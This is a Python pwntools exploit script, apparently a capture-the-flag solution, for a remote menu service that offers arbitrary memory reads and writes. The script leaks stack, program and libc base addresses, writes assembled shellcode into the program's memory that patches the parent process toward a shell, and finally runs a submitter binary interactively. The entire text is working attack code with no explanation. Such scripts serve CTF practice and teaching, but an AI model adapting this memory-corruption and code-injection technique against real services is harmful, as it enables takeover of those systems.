#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

#p = process("challenge")
p = remote(HOST, int(PORT))

p.sendlineafter(b'Choice: ', b'1')
p.sendlineafter(b'Address: ', b'0')

p.recvuntil(b'Value: ')
stack_base = int(p.recvn(12),16)
print(f'stack_base = {hex(stack_base)}')

for i in range(0x100):
    p.sendlineafter(b'Choice: ', b'1')
    p.sendlineafter(b'Address: ', hex(stack_base-0x8*i).encode())

    p.recvuntil(b'Value: ')
    lic = int(p.recvuntil(b'\n',drop=True), 16)
    if lic&0xff0000000000 in [0x550000000000, 0x560000000000]:
        pie_base = lic - 0x1285
        break

for i in range(0x100):
    p.sendlineafter(b'Choice: ', b'1')
    p.sendlineafter(b'Address: ', hex(stack_base-0x8*i).encode())

    p.recvuntil(b'Value: ')
    lic = int(p.recvuntil(b'\n',drop=True), 16)
    if lic&0xff0000000000 == 0x7f0000000000 and lic&0xfff == 0xe40:
        libc_base = lic - 0x29e40
        off = stack_base-0x8*i -0xa0
        break

print(f'pie_base = {hex(pie_base)}')
print(f'libc_base = {hex(libc_base)}')
print(f'off = {hex(off)}')

context.arch = 'amd64'

sh = f'''
    mov rax, 110 
    syscall
    
    mov rdi, rax;
    mov rsi, {off}
    mov rdx, {libc_base+0x000000000002a745}

    mov r10, {pie_base+0x14FC}
    call r10;

    mov rsi, {off+0x8}
    mov rdx, {libc_base+0x1d8678}

    mov r10, {pie_base+0x14FC}
    call r10;

    mov rsi, {off+0x18}
    mov rdx, {libc_base+0x50d70}

    mov r10, {pie_base+0x14FC}
    call r10;

'''

sh = asm(sh)

v = []
addr = []

for i in range(0, len(sh), 8):
    v.append(hex(u64(sh[i:i+8].ljust(8, b'\x90'))).encode())
    addr.append(hex(pie_base+0x1486+i).encode())

for i in range(len(v)-1,-1,-1):
    p.sendlineafter(b'Choice: ', b'2')
    p.sendlineafter(b'Value: ', v[i])
    p.sendlineafter(b'Address: ', addr[i])

time.sleep(1)
p.sendlineafter(b'Choice: ', b'3')

p.sendline(b'./submitter')

p.interactive()